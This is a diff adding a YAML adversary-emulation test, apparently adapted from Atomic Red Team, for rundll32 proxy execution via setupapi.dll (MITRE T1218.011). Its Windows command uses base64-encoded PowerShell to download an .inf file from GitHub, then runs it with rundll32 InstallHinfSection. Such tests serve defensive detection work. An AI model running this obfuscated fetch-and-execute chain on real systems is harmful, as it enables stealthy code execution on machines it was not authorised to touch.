@@ -1,0 +1,21 @@
+- id: b759ed36-2cf8-5cbc-ad48-e4ccef2f05e1
+  name: Soumaia ART Tests - Rundll32 setupapi.dll Execution
+  description: 'Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying "installation failed" will be opened
+
+
+    Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml'
+  tactic: stealth
+  technique:
+    attack_id: T1218.011
+    name: 'Signed Binary Proxy Execution: Rundll32'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAyADEAOAAuADAAMQAxAF8ARABlAGYAYQB1AGwAdABJAG4AcwB0AGEAbABsAC4AaQBuAGYAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMgAxADgALgAwADEAMQBfAEQAZQBmAGEAdQBsAHQASQBuAHMAdABhAGwAbAAuAGkAbgBmACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMgAxADgALgAwADEAMQAvAHMAcgBjAC8AVAAxADIAMQA4AC4AMAAxADEAXwBEAGUAZgBhAHUAbAB0AEkAbgBzAHQAYQBsAGwALgBpAG4AZgAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwAVAAxADIAMQA4AC4AMAAxADEAXwBEAGUAZgBhAHUAbAB0AEkAbgBzAHQAYQBsAGwALgBpAG4AZgAiAAoA
+          )
+          rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ".\T1218.011_DefaultInstall.inf"
+        payloads:
+        - T1218.011_DefaultInstall.inf
